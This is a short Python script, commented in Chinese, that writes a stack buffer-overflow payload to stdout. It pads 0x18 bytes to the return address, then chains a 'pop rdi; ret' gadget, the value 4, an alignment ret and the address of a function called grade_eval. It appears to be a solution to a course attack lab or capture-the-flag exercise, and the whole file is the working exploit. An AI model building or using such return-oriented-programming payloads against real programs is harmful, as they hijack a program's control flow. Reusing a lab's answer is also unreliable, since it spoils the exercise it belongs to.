import sys, struct

q = lambda x: struct.pack("<Q", x)

payload  = b"A" * 0x18      # 填充到返回地址
payload += q(0x401a79)      # pop rdi; ret
payload += q(4)             # rdi = 4
payload += q(0x401a34)      # 纯 ret，用于栈对齐
payload += q(0x401978)      # grade_eval

sys.stdout.buffer.write(payload)
